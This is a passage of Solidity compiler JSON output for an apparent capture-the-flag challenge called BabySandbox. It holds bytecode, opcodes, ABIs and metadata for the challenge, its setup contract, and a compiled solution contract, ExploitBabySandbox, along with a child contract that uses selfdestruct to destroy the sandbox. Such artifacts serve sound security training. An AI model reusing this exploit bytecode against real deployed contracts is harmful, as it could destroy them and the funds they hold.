SHR PUSH2 0x11C PUSH2 0x63 PUSH1 0x0 CODECOPY DUP1 PUSH1 0x2E MSTORE POP PUSH2 0x11C PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x919840AD EQ PUSH1 0xC5 JUMPI PUSH1 0x2C JUMP JUMPDEST JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x919840AD PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0x93 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH1 0xA3 JUMPI POP PUSH1 0x1 JUMPDEST PUSH1 0xAA JUMPI PUSH1 0xC3 JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST STOP JUMPDEST PUSH1 0xCB PUSH1 0xCD JUMP JUMPDEST STOP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP13 SUB PUSH24 0xEE8BFA8B1DEFAF71A01DA3715A154DC74EAB395160D68838 0xFB SMOD 0x4F 0xD PC PUSH5 0x736F6C6343 STOP SMOD STOP STOP CALLER ",
              "sourceMap": "325:221:1:-:0;;;386:59;;;;;;;;;;426:11;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;410:5;;:28;;;;;;;;;;;;;;;;;;325:221;;;;;;;;;;:::o;:::-;;;;;;;"
            },
            "deployedBytecode": {
              "immutableReferences": {},
              "linkReferences": {},
              "object": "608060405234801561001057600080fd5b50600436106100365760003560e01c8063237b5e961461003b5780634b64e4921461006f575b600080fd5b6100436100b3565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6100b16004803603602081101561008557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100d7565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8073ffffffffffffffffffffffffffffffffffffffff16631984916f6040518163ffffffff1660e01b815260040160206040518083038186803b15801561011d57600080fd5b505afa158015610131573d6000803e3d6000fd5b505050506040513d602081101561014757600080fd5b810190808051906020019092919050505073ffffffffffffffffffffffffffffffffffffffff1663522bb70460008054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b1580156101e057600080fd5b505af11580156101f4573d6000803e3d6000fd5b505050505056fea264697066735822122009764e212eed15b7d9534f38b6b9ef8bebe06b12e702443489a057d11551292f64736f6c63430007000033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x237B5E96 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x4B64E492 EQ PUSH2 0x6F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0xB3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xB1 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x85 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xD7 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1984916F PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x11D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x131 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x522BB704 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1F4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MULMOD PUSH23 0x4E212EED15B7D9534F38B6B9EF8BEBE06B12E702443489 LOG0 JUMPI 0xD1 ISZERO MLOAD 0x29 0x2F PUSH5 0x736F6C6343 STOP SMOD STOP STOP CALLER ",
              "sourceMap": "325:221:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;360:20;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;451:93;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;360:20;;;;;;;;;;;;:::o;451:93::-;511:5;:13;;;:15;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:19;;;531:5;;;;;;;;;;511:26;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;451:93;:::o"
            },
            "methodIdentifiers": {
              "child()": "237b5e96",
              "execute(address)": "4b64e492"
            }
          },
          "metadata": "{\"compiler\":{\"version\":\"0.7.0+commit.9e61f92b\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"child\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract SetupBabySandbox\",\"name\":\"setup\",\"type\":\"address\"}],\"name\":\"execute\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/babysandbox/ExploitBabySandbox.sol\":\"ExploitBabySandbox\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/babysandbox/BabySandbox.sol\":{\"keccak256\":\"0xd471950f4b2de4ecd74016698d51a3283a1d70a22e8670b06327e8a9966c3f74\",\"urls\":[\"bzz-raw://3f29a6c4c38b242f62b184ab36cdad9d5c9c2d16928e938b33375428a83a71f1\",\"dweb:/ipfs/QmQmxLEShHreuiZH3GLroo4bHfBF5HRLmbvc72C13wL8Sz\"]},\"contracts/babysandbox/ExploitBabySandbox.sol\":{\"keccak256\":\"0x1b1a7fb4364797aee858c38ca7a21579e6a194093bd34f129fbcb10f28d46e34\",\"urls\":[\"bzz-raw://a181aee1a9f1eb0396188875db45e5a42c46c0658df66c02f4d1ead5b525f875\",\"dweb:/ipfs/QmUBDujyogDiT4EoHwrEYpkMyuoQ7u37kWYvZUXXUAeG28\"]},\"contracts/babysandbox/SetupBabySandbox.sol\":{\"keccak256\":\"0x3b0af79501ec145ce8fce82ffece485adacd0fb923a23704e9b6713fcf68dfa7\",\"urls\":[\"bzz-raw://39eb3e003ac70a4c076fa9fea1636f9f1416ef27b29ece0c8e284d43cab723fb\",\"dweb:/ipfs/QmQoLyMQD3GsbGdGJWt3UTHDBZJB8JZBqmnnJJrM6JM73g\"]}},\"version\":1}"
        }
      },
      "contracts/babysandbox/SetupBabySandbox.sol": {
        "SetupBabySandbox": {
          "abi": [
            {
              "inputs": [],
              "stateMutability": "nonpayable",
              "type": "constructor"
            },
            {
              "inputs": [],
              "name": "isSolved",
              "outputs": [
                {
                  "internalType": "bool",
                  "name": "",
                  "type": "bool"
                }
              ],
              "stateMutability": "view",
              "type": "function"
            },
            {
              "inputs": [],
              "name": "sandbox",
              "outputs": [
                {
                  "internalType": "contract BabySandbox",
                  "name": "",
                  "type": "address"
                }
              ],
              "stateMutability": "view",
              "type": "function"
            }
          ],
          "evm": {
            "bytecode": {
              "linkReferences": {},
              "object": "608060405234801561001057600080fd5b5060405161001d9061007e565b604051809103906000f080158015610039573d6000803e3d6000fd5b506000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061008b565b61014c8061018d83390190565b60f4806100996000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80631984916f14603757806364d98f6e146069575b600080fd5b603d6087565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b606f60ab565b60405180821515815260200191505060405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000806000543b9050600081149150509056fea26469706673582212206089fa941b8165090ae4df42fc64247d15c79ad8fd4cc6b6c962740f8130b2e564736f6c63430007000033608060405234801561001057600080fd5b5061012c806100206000396000f3fe608060405260043610601c5760003560e01c8063522bb704146021575b600080fd5b606060048036036020811015603557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506062565b005b30331415609a57600080600080845af46000811460845760018114608e576098565b3d6000803e3d6000fd5b3d6000803e3d6000f35b505b61f0005a101560a857600080fd5b366000803760008036600030614000fa60c057600080fd5b6000803660008030614000f16000811460de576001811460e85760f2565b3d6000803e3d6000fd5b3d6000803e3d6000f35b505056fea26469706673582212208fdbfa6bf9f1f15affb8fe6a162950ff955101325b72cf5bdf47ed43fa92eb7464736f6c63430007000033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x1D SWAP1 PUSH2 0x7E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0x39 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x8B JUMP JUMPDEST PUSH2 0x14C DUP1 PUSH2 0x18D DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH1 0xF4 DUP1 PUSH2 0x99 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1984916F EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0x64D98F6E EQ PUSH1 0x69 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x87 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x6F PUSH1 0xAB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SLOAD EXTCODESIZE SWAP1 POP PUSH1 0x0 DUP2 EQ SWAP2 POP POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH1 0x89 STATICCALL SWAP5 SHL DUP2 PUSH6 0x90AE4DF42FC PUSH5 0x247D15C79A 0xD8 REVERT 0x4C 0xC6 0xB6 0xC9 PUSH3 0x740F81 ADDRESS 0xB2 0xE5 PUSH5 0x736F6C6343 STOP SMOD STOP STOP CALLER PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x12C DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x522BB704 EQ PUSH1 0x21 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x35 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x62 JUMP JUMPDEST STOP JUMPDEST ADDRESS CALLER EQ ISZERO PUSH1 0x9A JUMPI PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 DUP5 GAS DELEGATECALL PUSH1 0x0 DUP2 EQ PUSH1 0x84 JUMPI PUSH1 0x1 DUP2 EQ PUSH1 0x8E JUMPI PUSH1 0x98 JUMP JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 RETURN JUMPDEST POP JUMPDEST PUSH2 0xF000 GAS LT ISZERO PUSH1 0xA8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH1 0x0 DUP1 CALLDATACOPY PUSH1 0x0 DUP1 CALLDATASIZE PUSH1 0x0 ADDRESS PUSH2 0x4000 STATICCALL PUSH1 0xC0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 CALLDATASIZE PUSH1 0x0 DUP1 ADDRESS PUSH2 0x4000 CALL PUSH1 0x0 DUP2 EQ PUSH1 0xDE JUMPI PUSH1 0x1 DUP2 EQ PUSH1 0xE8 JUMPI PUSH1 0xF2 JUMP JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 RETURN JUMPDEST POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP16 0xDB STATICCALL PUSH12 0xF9F1F15AFFB8FE6A162950FF SWAP6 MLOAD ADD ORIGIN JUMPDEST PUSH19 0xCF5BDF47ED43FA92EB7464736F6C6343000700 STOP CALLER ",
              "sourceMap": "53:320:2:-:0;;;122:58;;;;;;;;;;156:17;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;146:7;;:27;;;;;;;;;;;;;;;;;;53:320;;;;;;;;;;:::o;:::-;;;;;;;"
            },
            "deployedBytecode": {
              "immutableReferences": {},
              "linkReferences": {},
              "object": "6080604052348015600f57600080fd5b506004361060325760003560e01c80631984916f14603757806364d98f6e146069575b600080fd5b603d6087565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b606f60ab565b60405180821515815260200191505060405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000806000543b9050600081149150509056fea26469706673582212206089fa941b8165090ae4df42fc64247d15c79ad8fd4cc6b6c962740f8130b2e564736f6c63430007000033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1984916F EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0x64D98F6E EQ PUSH1 0x69 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x87 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x6F PUSH1 0xAB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SLOAD EXTCODESIZE SWAP1 POP PUSH1 0x0 DUP2 EQ SWAP2 POP POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH1 0x89 STATICCALL SWAP5 SHL DUP2 PUSH6 0x90AE4DF42FC PUSH5 0x247D15C79A 0xD8 REVERT 0x4C 0xC6 0xB6 0xC9 PUSH3 0x740F81 ADDRESS 0xB2 0xE5 PUSH5 0x736F6C6343 STOP SMOD STOP STOP CALLER ",
              "sourceMap": "53:320:2:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;85:26;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;190:181;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;85:26;;;;;;;;;;;;:::o;190:181::-;231:4;247:9;315:12;309:19;297:32;289:40;;363:1;355:4;:9;348:16;;;190:181;:::o"
            },
            "methodIdentifiers": {
              "isSolved()": "64d98f6e",
              "sandbox()": "1984916f"
            }
          },
          "metadata": "{\"compiler\":{\"version\":\"0.7.0+commit.9e61f92b\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"isSolved\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sandbox\",\"outputs\":[{\"internalType\":\"contract BabySandbox\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/babysandbox/SetupBabySandbox.sol\":\"SetupBabySandbox\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/babysandbox/BabySandbox.sol\":{\"keccak256\":\"0xd471950f4b2de4ecd74016698d51a3283a1d70a22e8670b06327e8a9966c3f74\",\"urls\":[\"bzz-raw://3f29a6c4c38b242f62b184ab36cdad9d5c9c2d16928e938b33375428a83a71f1\",\"dweb:/ipfs/QmQmxLEShHreuiZH3GLroo4bHfBF5HRLmbvc72C13wL8Sz\"]},\"contracts/babysandbox/SetupBabySandbox.sol\":{\"keccak256\":\"0x3b0af79501ec145ce8fce82ffece485adacd0fb923a23704e9b6713fcf68dfa7\",\"urls\":[\"bzz-raw://39eb3e003ac70a4c076fa9fea1636f9f1416ef27b29ece0c8e284d43cab723fb\",\"dweb:/ipfs/QmQoLyMQD3GsbGdGJWt3UTHDBZJB8JZBqmnnJJrM6JM73g\"]}},\"version\":1}"
        }
      }
    },
    "errors": [
      {
        "component": "general",
        "errorCode": "1878",
        "formattedMessage": "contracts/babysandbox/BabySandbox.sol: Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n",
        "message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
        "severity": "warning",
        "sourceLocation": {
          "end": -1,
          "file": "contracts/babysandbox/BabySandbox.sol",
          "start": -1
        },
        "type": "Warning"
      },
      {
        "component": "general",
        "errorCode": "1878",
        "formattedMessage": "contracts/babysandbox/ExploitBabySandbox.sol: Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n",
        "message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
        "severity": "warning",
        "sourceLocation": {
          "end": -1,
          "file": "contracts/babysandbox/ExploitBabySandbox.sol",
          "start": -1
        },
        "type": "Warning"
      },
      {
        "component": "general",
        "errorCode": "1878",
        "formattedMessage": "contracts/babysandbox/SetupBabySandbox.sol: Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n",
        "message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
        "severity": "warning",
        "sourceLocation": {
          "end": -1,
          "file": "contracts/babysandbox/SetupBabySandbox.sol",
          "start": -1
        },
        "type": "Warning"
      }
    ],
    "sources": {
      "contracts/babysandbox/BabySandbox.sol": {
        "ast": {
          "absolutePath": "contracts/babysandbox/BabySandbox.sol",
          "exportedSymbols": {
            "BabySandbox": [
              9
            ]
          },
          "id": 10,
          "license": null,
          "nodeType": "SourceUnit",
          "nodes": [
            {
              "id": 1,
              "literals": [
                "solidity",
                "0.7",
                ".0"
              ],
              "nodeType": "PragmaDirective",
              "src": "0:22:0"
            },
            {
              "abstract": false,
              "baseContracts": [],
              "contractDependencies": [],
              "contractKind": "contract",
              "documentation": null,
              "fullyImplemented": true,
              "id": 9,
              "linearizedBaseContracts": [
                9
              ],
              "name": "BabySandbox",
              "nodeType": "ContractDefinition",
              "nodes": [
                {
                  "body": {
                    "id": 7,
                    "nodeType": "Block",
                    "src": "96:1728:0",
                    "statements": [
                      {
                        "AST": {
                          "nodeType": "YulBlock",
                          "src": "115:1693:0",
                          "statements": [
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "236:441:0",
                                "statements": [
                                  {
                                    "cases": [
                                      {
                                        "body": {
                                          "nodeType": "YulBlock",
                                          "src": "341:147:0",
                                          "statements": [
                                            {
                                              "expression": {
                                                "arguments": [
                                                  {
                                                    "kind": "number",
                                                    "nodeType": "YulLiteral",
                                                    "src": "382:4:0",
                                                    "type": "",
                                                    "value": "0x00"
                                                  },
                                                  {
                                                    "kind": "number",
                                                    "nodeType": "YulLiteral",
                                                    "src": "388:4:0",
                                                    "type": "",
                                                    "value": "0x00"
                                                  },
                                                  {
                                                    "arguments": [],
                                                    "functionName": {
                                                      "name": "returndatasize",
                                                      "nodeType": "YulIdentifier",
                                                      "src": "394:14:0"
                                                    },
                                                    "nodeType": "YulFunctionCall",
                                                    "src": "394:16:0"
                                                  }
                                                ],
                                                "functionName": {
                                                  "name": "returndatacopy",
                                                  "nodeType": "YulIdentifier",
                                                  "src": "367:14:0"
                                                },
                                                "nodeType": "YulFunctionCall",
                                                "src": "367:44:0"
                                              },
                                              "nodeType": "YulExpressionStatement",
                                              "src": "367:44:0"
                                            },
                                            {
                                              "expression": {
                                                "arguments": [
                                                  {
                                                    "kind": "number",
                                                    "nodeType": "YulLiteral",
                                                    "src": "443:4:0",
                                                    "type": "",
                                                    "value": "0x00"
                                                  },
                                                  {
                                                    "arguments": [],
                                                    "functionName": {
                                                      "name": "returndatasize",
                                                      "nodeType": "YulIdentifier",
                                                      "src": "449:14:0"
                                                    },
                                                    "nodeType": "YulFunctionCall",
                                                    "src": "449:16:0"
                                                  }
                                                ],
                                                "functionName": {
                                                  "name": "revert",
                                                  "nodeType": "YulIdentifier",
                                                  "src": "436:6:0"
                                                },
                                                "nodeType": "YulFunctionCall",
                                                "src": "436:30:0"
                                              },
                                              "nodeType": "YulExpressionStatement",
                                              "src": "436:30:0"
                                            }
                                          ]
                                        },
                                        "nodeType": "YulCase",
                                        "src": "334:154:0",
                                        "value": {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "339:1:0",
                                          "type": "",
                                          "value": "0"
                                        }
                                      },
                                      {
                                        "body": {
                                          "nodeType": "YulBlock",
                                          "src": "516:147:0",
                                          "statements": [
                                            {
                                              "expression": {
                                                "arguments": [
                                                  {
                                                    "kind": "number",
                                                    "nodeType": "YulLiteral",
                                                    "src": "557:4:0",
                                                    "type": "",
                                                    "value": "0x00"
                                                  },
                                                  {
                                                    "kind": "number",
                                                    "nodeType": "YulLiteral",
                                                    "src": "563:4:0",
                                                    "type": "",
                                                    "value": "0x00"
                                                  },
                                                  {
                                                    "arguments": [],
                                                    "functionName": {
                                                      "name": "returndatasize",
                                                      "nodeType": "YulIdentifier",
